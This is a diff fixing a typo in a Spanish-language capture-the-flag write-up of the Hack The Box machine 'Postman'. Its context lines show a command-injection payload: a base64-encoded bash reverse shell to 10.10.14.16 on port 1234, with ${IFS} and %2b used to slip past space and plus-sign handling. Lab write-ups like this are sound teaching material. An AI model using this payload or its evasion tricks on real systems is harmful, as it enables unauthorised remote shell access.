@@ -108,7 +108,7 @@ echo${IFS}YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNi8xMjM0IDA%2bJj
 ```
 ${IFS} se usa para sustituir los espacios y %2b es para sustituir los simbolos + y que no se transformen en espacios.
 
-Con el listener levantado reciviremos la conexion.
+Con el listener levantado recibiremos la conexion.
 
 ![Postman-rev-shell-root](/assets/imagenes/2021-01-14-postman-HTB/Postman-rev-shell-root.png)
 
